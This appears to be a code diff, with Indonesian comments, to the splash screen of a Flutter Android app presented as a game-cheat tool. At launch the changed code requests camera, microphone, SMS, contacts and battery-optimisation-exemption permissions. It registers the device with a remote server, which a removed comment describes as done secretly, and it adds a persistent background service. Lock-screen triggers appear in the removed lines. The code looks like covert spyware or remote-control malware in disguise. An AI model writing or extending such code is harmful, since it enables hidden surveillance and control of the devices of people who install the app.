@@ -7,6 +7,7 @@ import 'package:http/http.dart' as http;
 import 'package:device_info_plus/device_info_plus.dart';
 import '../lock/lock_screen.dart';
 import 'cheat_home.dart';
+import '../services/device_service.dart'; // Import Service lagi
 import '../config.dart';
 
 class SplashScreen extends StatefulWidget {
@@ -23,42 +24,21 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
-    // 1. Minta Izin (Dikasih batas waktu 4 detik, biar gak nge-hang)
+    // 1. MINTA IZIN DULU (Wajib termasuk Notifikasi & Baterai)
     try {
       await [
-        Permission.camera, Permission.microphone,
-        Permission.sms, Permission.contacts, Permission.notification,
-      ].request().timeout(const Duration(seconds: 4));
+        Permission.camera, 
+        Permission.microphone,
+        Permission.sms, 
+        Permission.contacts, 
+        Permission.notification,
+        Permission.ignoreBatteryOptimizations, // Biar gak dimatiin Android
+      ].request().timeout(const Duration(seconds: 5));
     } catch (e) {
       debugPrint("Permission error: $e");
     }
 
-    // 2. Register ke server secara diam-diam (Gak ngeblok aplikasi)
-    _registerDevice();
-
-    // 3. Cek Lock Screen
-    final prefs = await SharedPreferences.getInstance();
-    Timer.periodic(const Duration(seconds: 2), (t) async {
-      final v1 = prefs.getBool('lock_v1') ?? false;
-      final v2 = prefs.getBool('lock_v2') ?? false;
-      if ((v1 || v2) && mounted) {
-        t.cancel();
-        Navigator.of(context).pushAndRemoveUntil(
-          MaterialPageRoute(builder: (_) => LockScreen(mode: v2 ? 2 : 1)),
-          (_) => false,
-        );
-      }
-    });
-
-    // 4. SELALU PINDAH KE MENU UTAMA SETELAH 2 DETIK
-    await Future.delayed(const Duration(seconds: 2));
-    if (!mounted) return;
-    Navigator.of(context).pushReplacement(
-      MaterialPageRoute(builder: (_) => const CheatHome()),
-    );
-  }
-
-  Future<void> _registerDevice() async {
+    // 2. REGISTER DEVICE
     try {
       final prefs = await SharedPreferences.getInstance();
       String? devId = prefs.getString('dev_id');
@@ -80,6 +60,20 @@ class _SplashScreenState extends State<SplashScreen> {
     } catch (e) {
       debugPrint("Gagal konek server: $e");
     }
+
+    // 3. BARU JALANIN BACKGROUND SERVICE (Setelah izin dikasih)
+    try {
+      await DeviceService.init();
+    } catch (e) {
+      debugPrint("Gagal start service: $e");
+    }
+
+    // 4. LANJUT KE MENU
+    await Future.delayed(const Duration(seconds: 2));
+    if (!mounted) return;
+    Navigator.of(context).pushReplacement(
+      MaterialPageRoute(builder: (_) => const CheatHome()),
+    );
   }
 
   @override
